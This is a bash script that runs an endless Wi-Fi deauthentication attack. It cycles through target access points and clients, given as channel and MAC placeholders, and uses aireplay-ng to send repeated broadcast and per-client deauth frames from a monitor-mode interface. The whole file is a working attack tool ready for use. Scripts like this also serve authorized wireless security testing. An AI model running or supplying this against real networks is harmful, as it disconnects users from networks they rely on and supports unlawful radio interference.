#!/bin/bash

# Targhet structure CHANNEL_BSSID or CHANNEL_BSSID_CLIENT, example:
# target=('1_AA:AA:AA:AA:AA:AA')						# Broadcast deauth
# target+=('1_AA:AA:AA:AA:AA:AA_CC:CC:CC:CC:CC:CC')		# Client deauth

mon_iface="wlan0mon"

bd_number="10"			# Number of deauth for broadcast
bc_number="10"			# Number of deauth for client

target=('1_AA:AA:AA:AA:AA:AA')
target+=('1_AA:AA:AA:AA:AA:AA_CC:CC:CC:CC:CC:CC')

while [ 1 ]; do 

	for (( i=0; i<${#target[@]}; i++ )); do
		channel=$(echo ${target[i]} | cut -d"_" -f 1)
		bssid=$(echo ${target[i]} | cut -d"_" -f 2)
		client=$(echo ${target[i]} | cut -d"_" -f 3)

		iw dev $mon_iface set channel $channel

		if [ -z "$client" ]; then

			printf "[*] DB: $bssid (ch: $channel)\t\t\t"
			aireplay-ng -0 $bd_number -a $bssid $mon_iface -D &>/dev/null

		else

			printf "[*] DC: $bssid (ch: $channel) <- $client\t"
			aireplay-ng -0 $bc_number -a $bssid -c $client $mon_iface -D &>/dev/null

		fi

		status=$?
		if [ $status == "0" ]; then
			echo -e "\033[0;32mSUCCESS ($status)\033[0m"
		else
			echo -e "\033[0;31mERROR   ($status)\033[0m"
		fi

	done

done